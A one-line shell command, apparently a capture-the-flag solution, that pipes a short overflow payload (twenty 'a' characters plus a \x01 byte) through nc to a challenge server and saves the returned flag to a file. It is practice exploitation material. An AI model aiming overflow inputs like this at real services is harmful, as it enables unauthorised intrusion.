python -c "print('aaaaaaaaaaaaaaaaaaaa'+'\x01')" | nc boofy.tghack.no 6003 | tail -1 > flag.txt
